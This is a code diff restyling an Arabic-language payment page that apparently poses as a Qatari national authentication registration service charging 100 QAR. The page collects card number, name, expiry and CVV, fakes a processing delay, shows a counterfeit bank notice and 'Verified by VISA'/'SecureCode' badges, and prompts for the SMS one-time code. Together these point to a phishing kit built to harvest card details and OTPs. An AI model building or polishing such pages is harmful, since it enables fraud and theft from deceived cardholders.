@@ -36,87 +36,183 @@
             margin: 0;
         }
         
-        .payment-summary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        /* Banking Style Payment Summary */
+        .payment-summary-box {
+            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
             color: white;
-            border-radius: 8px;
+            border-radius: 10px;
             padding: 25px;
             margin-bottom: 30px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 12px rgba(30, 58, 138, 0.2);
         }
         
-        .payment-summary h3 {
+        .payment-summary-box h3 {
             margin: 0 0 15px 0;
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 600;
+            opacity: 0.95;
         }
         
-        .payment-summary .amount {
-            font-size: 36px;
+        .payment-summary-box .amount {
+            font-size: 42px;
             font-weight: bold;
-            margin: 10px 0;
+            margin: 15px 0;
+            letter-spacing: 1px;
         }
         
-        .payment-summary .description {
+        .payment-summary-box .description {
             font-size: 14px;
             opacity: 0.9;
+            margin-top: 10px;
         }
         
-        /* Stripe-like Card Form */
-        .card-element {
+        .payment-summary-box .transaction-id {
+            font-size: 12px;
+            opacity: 0.8;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        /* Credit Card Visual */
+        .credit-card-visual {
+            background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .credit-card-visual::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+        }
+        
+        .card-chip {
+            width: 45px;
+            height: 35px;
+            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            border-radius: 6px;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .card-chip::after {
+            content: '';
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            right: 5px;
+            bottom: 5px;
+            border: 1px solid rgba(0,0,0,0.2);
+            border-radius: 3px;
+        }
+        
+        .card-number-display {
+            color: white;
+            font-size: 22px;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 3px;
+            margin: 20px 0;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .card-holder-display {
+            color: rgba(255,255,255,0.9);
+            font-size: 14px;
+            text-transform: uppercase;
+            margin-top: 15px;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .card-expiry-display {
+            color: rgba(255,255,255,0.8);
+            font-size: 13px;
+            margin-top: 5px;
+            direction: ltr;
+            text-align: left;
+        }
+        
+        .card-brand-logo {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            width: 50px;
+            height: 32px;
+        }
+        
+        /* Banking Form */
+        .banking-form {
             background-color: #fff;
-            border-radius: 8px;
+            border-radius: 10px;
             padding: 30px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
             margin-bottom: 25px;
         }
         
-        .form-row {
-            margin-bottom: 20px;
+        .form-group-banking {
+            margin-bottom: 25px;
         }
         
-        .form-row label {
+        .form-group-banking label {
             display: block;
             font-weight: 600;
-            color: #32325d;
+            color: #1f2937;
             font-size: 14px;
             margin-bottom: 8px;
         }
         
-        .input-wrapper {
+        .form-group-banking label .required {
+            color: #dc2626;
+            margin-right: 3px;
+        }
+        
+        .input-container {
             position: relative;
         }
         
-        .stripe-input {
+        .banking-input {
             width: 100%;
-            padding: 12px 45px 12px 12px;
+            padding: 14px 50px 14px 14px;
             font-size: 16px;
-            border: 1px solid #e0e0e0;
-            border-radius: 6px;
-            transition: all 0.2s ease;
-            background-color: #fff;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            background-color: #f9fafb;
             direction: ltr;
             text-align: left;
             font-family: 'Courier New', monospace;
         }
         
-        .stripe-input:focus {
+        .banking-input:focus {
             outline: none;
-            border-color: #8b1538;
-            box-shadow: 0 0 0 3px rgba(139, 21, 56, 0.1);
+            border-color: #3b82f6;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
         }
         
-        .stripe-input.error {
-            border-color: #e25950;
+        .banking-input.error {
+            border-color: #dc2626;
+            background-color: #fef2f2;
         }
         
-        .stripe-input.success {
-            border-color: #5cb85c;
+        .banking-input.success {
+            border-color: #10b981;
+            background-color: #f0fdf4;
         }
         
-        .card-brand-icon {
+        .input-icon {
             position: absolute;
-            right: 12px;
+            left: 14px;
             top: 50%;
             transform: translateY(-50%);
             width: 35px;
@@ -124,11 +220,11 @@
             display: none;
         }
         
-        .card-brand-icon.show {
+        .input-icon.show {
             display: block;
         }
         
-        .card-brand-icon img {
+        .input-icon img {
             width: 100%;
             height: 100%;
             object-fit: contain;
@@ -136,83 +232,90 @@
         
         .form-row-split {
             display: flex;
-            gap: 15px;
+            gap: 20px;
         }
         
         .form-row-split > div {
             flex: 1;
         }
         
-        .error-message {
-            color: #e25950;
+        .error-text {
+            color: #dc2626;
             font-size: 13px;
             margin-top: 6px;
             display: none;
         }
         
-        .error-message.show {
+        .error-text.show {
             display: block;
         }
         
-        .secure-badge {
-            text-align: center;
-            padding: 15px;
-            background-color: #f7fafc;
-            border-radius: 6px;
-            margin-top: 20px;
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            padding: 20px;
+            background-color: #f9fafb;
+            border-radius: 8px;
+            margin-top: 25px;
         }
         
-        .secure-badge i {
-            color: #5cb85c;
-            margin-left: 8px;
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #6b7280;
+            font-size: 13px;
+        }
+        
+        .security-badge i {
+            color: #10b981;
             font-size: 16px;
         }
         
-        .secure-badge span {
-            color: #6b7280;
-            font-size: 14px;
-        }
-        
-        .btn-pay {
+        .btn-pay-now {
             width: 100%;
-            background: linear-gradient(135deg, #8b1538 0%, #6d1029 100%);
+            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
             color: white;
             border: none;
-            padding: 14px;
-            font-size: 16px;
+            padding: 16px;
+            font-size: 17px;
             font-weight: 600;
-            border-radius: 6px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: all 0.2s ease;
-            margin-top: 20px;
+            transition: all 0.3s ease;
+            margin-top: 25px;
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
         }
         
-        .btn-pay:hover:not(:disabled) {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(139, 21, 56, 0.3);
+        .btn-pay-now:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(59, 130, 246, 0.4);
         }
         
-        .btn-pay:disabled {
+        .btn-pay-now:disabled {
             opacity: 0.6;
             cursor: not-allowed;
         }
         
-        .btn-back {
+        .btn-back-banking {
             width: 100%;
-            background-color: #f7fafc;
-            color: #4b5563;
-            border: 1px solid #e5e7eb;
-            padding: 12px;
+            background-color: #fff;
+            color: #6b7280;
+            border: 2px solid #e5e7eb;
+            padding: 14px;
             font-size: 15px;
             font-weight: 500;
-            border-radius: 6px;
+            border-radius: 8px;
             cursor: pointer;
             transition: all 0.2s ease;
-            margin-top: 10px;
+            margin-top: 12px;
         }
         
-        .btn-back:hover {
-            background-color: #e5e7eb;
+        .btn-back-banking:hover {
+            background-color: #f9fafb;
+            border-color: #d1d5db;
         }
         
         /* Modal Styles */
@@ -225,31 +328,46 @@
         .modal-header {
             border-bottom: 1px solid #e5e7eb;
             padding: 20px 25px;
+            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
+            border-radius: 12px 12px 0 0;
         }
         
         .modal-title {
-            color: #1f2937;
+            color: white;
             font-weight: 600;
             font-size: 18px;
         }
         
         .modal-body {
-            padding: 30px 25px;
+            padding: 35px 30px;
             text-align: center;
         }
         
-        .spinner-container {
-            margin: 30px 0;
+        .processing-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 25px;
+            background: linear-gradient(135deg, #3b82f6 0%, #1e3a8a 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.3);
         }
         
-        .spinner {
-            border: 3px solid #f3f4f6;
-            border-top: 3px solid #8b1538;
+        .processing-icon i {
+            color: white;
+            font-size: 36px;
+        }
+        
+        .spinner-ring {
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #3b82f6;
             border-radius: 50%;
             width: 50px;
             height: 50px;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
+            animation: spin 1s linear infinite;
+            margin: 25px auto;
         }
         
         @keyframes spin {
@@ -257,46 +375,33 @@
             100% { transform: rotate(360deg); }
         }
         
-        .card-icon-large {
-            width: 60px;
-            height: 38px;
-            margin: 20px auto;
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-        }
-        
-        .verified-badge {
-            width: 140px;
+        .verified-badge-img {
+            width: 150px;
             margin: 20px auto;
         }
         
-        .verified-badge img {
-            width: 100%;
-        }
-        
-        .bank-notification {
-            background-color: #f0f9ff;
-            border: 1px solid #bae6fd;
-            border-radius: 8px;
+        .bank-notification-box {
+            background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%);
+            border: 2px solid #93c5fd;
+            border-radius: 10px;
             padding: 20px;
             margin: 25px 0;
             text-align: right;
         }
         
-        .bank-notification p {
+        .bank-notification-box p {
             margin: 8px 0;
             color: #1e40af;
             font-size: 14px;
-            line-height: 1.6;
+            line-height: 1.7;
         }
         
-        .bank-notification strong {
-            color: #8b1538;
+        .bank-notification-box strong {
+            color: #1e3a8a;
             font-weight: 600;
         }
         
-        .otp-container {
+        .otp-inputs-container {
             display: flex;
             justify-content: center;
             gap: 12px;
@@ -304,69 +409,73 @@
             direction: ltr;
         }
         
-        .otp-digit {
-            width: 50px;
-            height: 55px;
+        .otp-box {
+            width: 55px;
+            height: 60px;
             text-align: center;
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 600;
-            border: 2px solid #e5e7eb;
-            border-radius: 8px;
+            border: 2px solid #d1d5db;
+            border-radius: 10px;
             transition: all 0.2s ease;
             font-family: 'Courier New', monospace;
+            background-color: #f9fafb;
         }
         
-        .otp-digit:focus {
+        .otp-box:focus {
             outline: none;
-            border-color: #8b1538;
-            box-shadow: 0 0 0 3px rgba(139, 21, 56, 0.1);
+            border-color: #3b82f6;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
         }
         
-        .resend-link {
-            color: #8b1538;
+        .resend-link-banking {
+            color: #3b82f6;
             text-decoration: none;
-            font-weight: 500;
+            font-weight: 600;
             font-size: 14px;
         }
         
-        .resend-link:hover {
+        .resend-link-banking:hover {
             text-decoration: underline;
+            color: #1e3a8a;
         }
         
-        .modal-actions {
+        .modal-buttons {
             display: flex;
-            gap: 10px;
-            margin-top: 25px;
+            gap: 12px;
+            margin-top: 30px;
         }
         
-        .modal-actions button {
+        .modal-buttons button {
             flex: 1;
-            padding: 12px;
-            border-radius: 6px;
+            padding: 14px;
+            border-radius: 8px;
             font-weight: 600;
             font-size: 15px;
             cursor: pointer;
             transition: all 0.2s ease;
         }
         
-        .btn-modal-primary {
-            background-color: #8b1538;
+        .btn-modal-verify {
+            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
             color: white;
             border: none;
         }
         
-        .btn-modal-primary:hover {
-            background-color: #6d1029;
+        .btn-modal-verify:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
         }
         
-        .btn-modal-secondary {
-            background-color: #f3f4f6;
-            color: #4b5563;
-            border: 1px solid #e5e7eb;
+        .btn-modal-cancel {
+            background-color: #fff;
+            color: #6b7280;
+            border: 2px solid #e5e7eb;
         }
         
-        .btn-modal-secondary:hover {
-            background-color: #e5e7eb;
+        .btn-modal-cancel:hover {
+            background-color: #f9fafb;
         }
     </style>
 </head>
@@ -388,41 +497,57 @@
                         </div>
                         
                         <!-- Payment Summary -->
-                        <div class="payment-summary">
-                            <h3>المبلغ المطلوب</h3>
+                        <div class="payment-summary-box">
+                            <h3>المبلغ المطلوب دفعه</h3>
                             <div class="amount">100.00 QAR</div>
                             <div class="description">رسوم التسجيل في نظام التوثيق الوطني</div>
+                            <div class="transaction-id">رقم المعاملة: TXN-2025-<span id="txnId"></span></div>
                         </div>
                         
-                        <!-- Card Form -->
-                        <div class="card-element">
+                        <!-- Credit Card Visual -->
+                        <div class="credit-card-visual">
+                            <div class="card-chip"></div>
+                            <div class="card-number-display" id="cardDisplay">•••• •••• •••• ••••</div>
+                            <div class="card-holder-display" id="holderDisplay">CARD HOLDER NAME</div>
+                            <div class="card-expiry-display" id="expiryDisplay">MM / YY</div>
+                            <div class="card-brand-logo" id="cardBrandDisplay"></div>
+                        </div>
+                        
+                        <!-- Banking Form -->
+                        <div class="banking-form">
                             <form id="paymentForm">
                                 
                                 <!-- Card Number -->
-                                <div class="form-row">
-                                    <label for="cardNumber">Card Number</label>
-                                    <div class="input-wrapper">
+                                <div class="form-group-banking">
+                                    <label for="cardNumber">
+                                        <span class="required">*</span>
+                                        رقم البطاقة
+                                    </label>
+                                    <div class="input-container">
                                         <input 
                                             type="text" 
                                             id="cardNumber" 
-                                            class="stripe-input" 
-                                            placeholder="1234 5678 9012 3456"
+                                            class="banking-input" 
+                                            placeholder="0000 0000 0000 0000"
                                             maxlength="19"
                                             autocomplete="cc-number"
                                             required>
-                                        <div class="card-brand-icon" id="cardBrandIcon"></div>
+                                        <div class="input-icon" id="cardIcon"></div>
                                     </div>
-                                    <div class="error-message" id="cardNumberError">رقم البطاقة غير صحيح</div>
+                                    <div class="error-text" id="cardError">رقم البطاقة غير صحيح</div>
                                 </div>
                                 
                                 <!-- Card Holder Name -->
-                                <div class="form-row">
-                                    <label for="cardHolder">Cardholder Name</label>
+                                <div class="form-group-banking">
+                                    <label for="cardHolder">
+                                        <span class="required">*</span>
+                                        اسم حامل البطاقة
+                                    </label>
                                     <input 
                                         type="text" 
                                         id="cardHolder" 
-                                        class="stripe-input" 
-                                        placeholder="JOHN DOE"
+                                        class="banking-input" 
+                                        placeholder="CARDHOLDER NAME"
                                         autocomplete="cc-name"
                                         style="text-transform: uppercase;"
                                         required>
@@ -430,45 +555,62 @@
                                 
                                 <!-- Expiry & CVV -->
                                 <div class="form-row-split">
-                                    <div>
-                                        <label for="expiryDate">Expiry Date</label>
+                                    <div class="form-group-banking">
+                                        <label for="expiryDate">
+                                            <span class="required">*</span>
+                                            تاريخ الانتهاء
+                                        </label>
                                         <input 
                                             type="text" 
                                             id="expiryDate" 
-                                            class="stripe-input" 
+                                            class="banking-input" 
                                             placeholder="MM / YY"
                                             maxlength="7"
                                             autocomplete="cc-exp"
                                             required>
-                                        <div class="error-message" id="expiryError">تاريخ غير صحيح</div>
+                                        <div class="error-text" id="expiryError">تاريخ غير صحيح</div>
                                     </div>
-                                    <div>
-                                        <label for="cvv">CVV</label>
+                                    <div class="form-group-banking">
+                                        <label for="cvv">
+                                            <span class="required">*</span>
+                                            رمز الأمان (CVV)
+                                        </label>
                                         <input 
                                             type="text" 
                                             id="cvv" 
-                                            class="stripe-input" 
+                                            class="banking-input" 
                                             placeholder="123"
                                             maxlength="4"
                                             autocomplete="cc-csc"
                                             required>
-                                        <div class="error-message" id="cvvError">CVV غير صحيح</div>
+                                        <div class="error-text" id="cvvError">رمز غير صحيح</div>
                                     </div>
                                 </div>
                                 
-                                <!-- Secure Badge -->
-                                <div class="secure-badge">
-                                    <i class="fa fa-lock"></i>
-                                    <span>Your payment is secure and encrypted</span>
+                                <!-- Security Badges -->
+                                <div class="security-badges">
+                                    <div class="security-badge">
+                                        <i class="fa fa-lock"></i>
+                                        <span>اتصال آمن ومشفر</span>
+                                    </div>
+                                    <div class="security-badge">
+                                        <i class="fa fa-shield"></i>
+                                        <span>محمي بـ SSL</span>
+                                    </div>
+                                    <div class="security-badge">
+                                        <i class="fa fa-check-circle"></i>
+                                        <span>معتمد من البنوك</span>
+                                    </div>
                                 </div>
                                 
                                 <!-- Submit Button -->
-                                <button type="submit" class="btn-pay" id="payBtn">
-                                    <i class="fa fa-lock" style="margin-left: 8px;"></i>
-                                    Pay 100.00 QAR
+                                <button type="submit" class="btn-pay-now" id="payBtn">
+                                    <i class="fa fa-credit-card" style="margin-left: 10px;"></i>
+                                    ادفع 100.00 ريال قطري
                                 </button>
                                 
-                                <button type="button" class="btn-back" onclick="window.location.href='/step3'">
+                                <button type="button" class="btn-back-banking" onclick="window.location.href='/step3'">
+                                    <i class="fa fa-arrow-right" style="margin-left: 8px;"></i>
                                     رجوع
                                 </button>
                             </form>
@@ -487,15 +629,15 @@
         <div class="modal-dialog" role="document">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h4 class="modal-title">Processing Payment</h4>
+                    <h4 class="modal-title">جاري معالجة الدفع</h4>
                 </div>
                 <div class="modal-body">
-                    <div class="card-icon-large" id="modalCardIcon"></div>
-                    <div class="spinner-container">
-                        <div class="spinner"></div>
+                    <div class="processing-icon">
+                        <i class="fa fa-credit-card"></i>
                     </div>
-                    <p style="color: #6b7280; margin-top: 20px;">Please wait while we process your payment...</p>
-                    <p style="color: #9ca3af; font-size: 13px;">Do not close this window</p>
+                    <div class="spinner-ring"></div>
+                    <p style="color: #4b5563; font-size: 16px; margin-top: 20px;">يرجى الانتظار...</p>
+                    <p style="color: #9ca3af; font-size: 14px;">جاري التحقق من بيانات البطاقة</p>
                 </div>
             </div>
         </div>
@@ -506,28 +648,28 @@
         <div class="modal-dialog" role="document">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h4 class="modal-title">Secure Verification</h4>
+                    <h4 class="modal-title">التحقق الآمن من الدفع</h4>
                 </div>
                 <div class="modal-body">
-                    <div class="verified-badge" id="verifiedBadge"></div>
+                    <div class="verified-badge-img" id="verifiedBadge"></div>
                     
-                    <div class="bank-notification">
-                        <p><strong>رسالة من البنك</strong></p>
+                    <div class="bank-notification-box">
+                        <p><strong>إشعار من البنك</strong></p>
                         <p>تم خصم مبلغ <strong>100.00 ريال قطري</strong> من بطاقتك المنتهية بـ <strong id="lastDigits">****</strong></p>
-                        <p>الرجاء إدخال رمز التحقق المرسل إلى هاتفك المسجل</p>
+                        <p>يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك المسجل لدى البنك</p>
                     </div>
                     
-                    <div class="otp-container" id="otpContainer">
+                    <div class="otp-inputs-container" id="otpContainer">
                         <!-- OTP inputs will be generated by JS -->
                     </div>
                     
                     <p style="color: #6b7280; font-size: 14px; margin-top: 20px;">
-                        لم تستلم الرمز؟ <a href="#" class="resend-link" id="resendOtp">إعادة الإرسال</a>
+                        لم تستلم الرمز؟ <a href="#" class="resend-link-banking" id="resendOtp">إعادة الإرسال</a>
                     </p>
                     
-                    <div class="modal-actions">
-                        <button type="button" class="btn-modal-secondary" onclick="location.reload()">إلغاء</button>
-                        <button type="button" class="btn-modal-primary" id="verifyBtn">تحقق</button>
+                    <div class="modal-buttons">
+                        <button type="button" class="btn-modal-cancel" onclick="location.reload()">إلغاء</button>
+                        <button type="button" class="btn-modal-verify" id="verifyBtn">تحقق وأكمل الدفع</button>
                     </div>
                 </div>
             </div>
@@ -542,18 +684,21 @@
         let cardType = '';
         let otpLength = 4;
         
-        // Card brand logos (SVG data URIs)
+        // Generate transaction ID
+        document.getElementById('txnId').textContent = Math.random().toString(36).substr(2, 9).toUpperCase();
+        
+        // Card brand logos
         const cardLogos = {
-            visa: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="40" height="26" viewBox="0 0 40 26"%3E%3Crect width="40" height="26" rx="3" fill="%231434CB"/%3E%3Ctext x="5" y="18" font-family="Arial" font-size="12" font-weight="bold" fill="white"%3EVISA%3C/text%3E%3C/svg%3E',
-            mastercard: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="40" height="26" viewBox="0 0 40 26"%3E%3Crect width="40" height="26" rx="3" fill="%23EB001B"/%3E%3Ccircle cx="13" cy="13" r="7" fill="%23FF5F00"/%3E%3Ccircle cx="27" cy="13" r="7" fill="%23F79E1B"/%3E%3C/svg%3E'
+            visa: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="50" height="32" viewBox="0 0 50 32"%3E%3Crect width="50" height="32" rx="4" fill="%231434CB"/%3E%3Ctext x="8" y="22" font-family="Arial" font-size="14" font-weight="bold" fill="white"%3EVISA%3C/text%3E%3C/svg%3E',
+            mastercard: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="50" height="32" viewBox="0 0 50 32"%3E%3Crect width="50" height="32" rx="4" fill="%23EB001B"/%3E%3Ccircle cx="16" cy="16" r="8" fill="%23FF5F00"/%3E%3Ccircle cx="34" cy="16" r="8" fill="%23F79E1B"/%3E%3C/svg%3E'
         };
         
         const verifiedLogos = {
-            visa: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="140" height="45" viewBox="0 0 140 45"%3E%3Crect width="140" height="45" rx="6" fill="%231434CB"/%3E%3Ctext x="10" y="28" font-family="Arial" font-size="14" font-weight="bold" fill="white"%3EVerified by VISA%3C/text%3E%3C/svg%3E',
-            mastercard: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="140" height="45" viewBox="0 0 140 45"%3E%3Crect width="140" height="45" rx="6" fill="%23000000"/%3E%3Ctext x="10" y="28" font-family="Arial" font-size="12" font-weight="bold" fill="white"%3EMasterCard SecureCode%3C/text%3E%3C/svg%3E'
+            visa: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="150" height="50" viewBox="0 0 150 50"%3E%3Crect width="150" height="50" rx="8" fill="%231434CB"/%3E%3Ctext x="15" y="32" font-family="Arial" font-size="16" font-weight="bold" fill="white"%3EVerified by VISA%3C/text%3E%3C/svg%3E',
+            mastercard: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="150" height="50" viewBox="0 0 150 50"%3E%3Crect width="150" height="50" rx="8" fill="%23000000"/%3E%3Ctext x="10" y="32" font-family="Arial" font-size="13" font-weight="bold" fill="white"%3EMasterCard SecureCode%3C/text%3E%3C/svg%3E'
         };
         
-        // Luhn algorithm for card validation
+        // Luhn algorithm
         function luhnCheck(cardNumber) {
             let sum = 0;
             let isEven = false;
@@ -573,17 +718,20 @@
             return sum % 10 === 0;
         }
         
-        // Card number formatting and validation
+        // Card number input
         const cardNumberInput = document.getElementById('cardNumber');
-        const cardBrandIcon = document.getElementById('cardBrandIcon');
-        const cardNumberError = document.getElementById('cardNumberError');
+        const cardIcon = document.getElementById('cardIcon');
+        const cardError = document.getElementById('cardError');
+        const cardDisplay = document.getElementById('cardDisplay');
+        const cardBrandDisplay = document.getElementById('cardBrandDisplay');
         
         cardNumberInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\s/g, '');
-            
-            // Format with spaces every 4 digits
             let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
             e.target.value = formatted;
+            
+            // Update card display
+            cardDisplay.textContent = formatted || '•••• •••• •••• ••••';
             
             // Detect card type
             if (value.length >= 1) {
@@ -592,48 +740,60 @@
                 if (firstDigit === '4') {
                     cardType = 'visa';
                     otpLength = 6;
-                    cardBrandIcon.innerHTML = `<img src="${cardLogos.visa}" alt="Visa">`;
-                    cardBrandIcon.classList.add('show');
-                    cardNumberError.classList.remove('show');
+                    cardIcon.innerHTML = `<img src="${cardLogos.visa}">`;
+                    cardIcon.classList.add('show');
+                    cardBrandDisplay.innerHTML = `<img src="${cardLogos.visa}">`;
+                    cardError.classList.remove('show');
                     e.target.classList.remove('error');
                 } else if (firstDigit === '5') {
                     cardType = 'mastercard';
                     otpLength = 4;
-                    cardBrandIcon.innerHTML = `<img src="${cardLogos.mastercard}" alt="Mastercard">`;
-                    cardBrandIcon.classList.add('show');
-                    cardNumberError.classList.remove('show');
+                    cardIcon.innerHTML = `<img src="${cardLogos.mastercard}">`;
+                    cardIcon.classList.add('show');
+                    cardBrandDisplay.innerHTML = `<img src="${cardLogos.mastercard}">`;
+                    cardError.classList.remove('show');
                     e.target.classList.remove('error');
                 } else {
                     cardType = '';
-                    cardBrandIcon.classList.remove('show');
-                    cardNumberError.classList.add('show');
+                    cardIcon.classList.remove('show');
+                    cardBrandDisplay.innerHTML = '';
+                    cardError.classList.add('show');
                     e.target.classList.add('error');
                 }
                 
-                // Validate with Luhn if complete
+                // Validate with Luhn
                 if (value.length === 16) {
                     if (luhnCheck(value)) {
                         e.target.classList.add('success');
                         e.target.classList.remove('error');
-                        cardNumberError.classList.remove('show');
+                        cardError.classList.remove('show');
                     } else {
                         e.target.classList.add('error');
                         e.target.classList.remove('success');
-                        cardNumberError.textContent = 'رقم البطاقة غير صحيح';
-                        cardNumberError.classList.add('show');
+                        cardError.classList.add('show');
                     }
                 }
             } else {
                 cardType = '';
-                cardBrandIcon.classList.remove('show');
-                cardNumberError.classList.remove('show');
+                cardIcon.classList.remove('show');
+                cardBrandDisplay.innerHTML = '';
+                cardError.classList.remove('show');
                 e.target.classList.remove('error', 'success');
             }
         });
         
-        // Expiry date formatting
+        // Card holder input
+        const cardHolderInput = document.getElementById('cardHolder');
+        const holderDisplay = document.getElementById('holderDisplay');
+        
+        cardHolderInput.addEventListener('input', function(e) {
+            holderDisplay.textContent = e.target.value.toUpperCase() || 'CARD HOLDER NAME';
+        });
+        
+        // Expiry date input
         const expiryInput = document.getElementById('expiryDate');
         const expiryError = document.getElementById('expiryError');
+        const expiryDisplay = document.getElementById('expiryDisplay');
         
         expiryInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
@@ -643,8 +803,9 @@
             }
             
             e.target.value = value;
+            expiryDisplay.textContent = value || 'MM / YY';
             
-            // Validate expiry
+            // Validate
             if (value.length === 7) {
                 const parts = value.split(' / ');
                 const month = parseInt(parts[0]);
@@ -664,7 +825,7 @@
             }
         });
         
-        // CVV validation
+        // CVV input
         const cvvInput = document.getElementById('cvv');
         const cvvError = document.getElementById('cvvError');
         
@@ -686,23 +847,21 @@
             
             // Validate
             if (!cardType || cardNumber.length !== 16 || !luhnCheck(cardNumber)) {
-                cardNumberError.classList.add('show');
+                cardError.classList.add('show');
                 cardNumberInput.classList.add('error');
                 return;
             }
             
             // Show processing modal
-            const modalCardIcon = document.getElementById('modalCardIcon');
-            modalCardIcon.style.backgroundImage = `url(${cardLogos[cardType]})`;
             $('#processingModal').modal('show');
             
-            // Simulate processing (3 seconds)
+            // Simulate processing
             setTimeout(function() {
                 $('#processingModal').modal('hide');
                 
                 // Setup OTP modal
                 const verifiedBadge = document.getElementById('verifiedBadge');
-                verifiedBadge.innerHTML = `<img src="${verifiedLogos[cardType]}" alt="Verified">`;
+                verifiedBadge.innerHTML = `<img src="${verifiedLogos[cardType]}" style="width: 100%;">`;
                 
                 document.getElementById('lastDigits').textContent = cardNumber.slice(-4);
                 
@@ -712,16 +871,14 @@
                 for (let i = 0; i < otpLength; i++) {
                     const input = document.createElement('input');
                     input.type = 'text';
-                    input.className = 'otp-digit';
+                    input.className = 'otp-box';
                     input.maxLength = 1;
                     input.dataset.index = i;
                     otpContainer.appendChild(input);
                 }
                 
-                // Setup OTP input handlers
                 setupOtpInputs();
                 
-                // Show OTP modal
                 $('#otpModal').modal('show');
                 otpContainer.children[0].focus();
             }, 3000);
@@ -729,7 +886,7 @@
         
         // OTP input handling
         function setupOtpInputs() {
-            const inputs = document.querySelectorAll('.otp-digit');
+            const inputs = document.querySelectorAll('.otp-box');
             
             inputs.forEach((input, index) => {
                 input.addEventListener('input', function(e) {
@@ -748,7 +905,7 @@
         
         // Verify OTP
         document.getElementById('verifyBtn').addEventListener('click', function() {
-            const inputs = document.querySelectorAll('.otp-digit');
+            const inputs = document.querySelectorAll('.otp-box');
             let otp = '';
             
             inputs.forEach(input => {
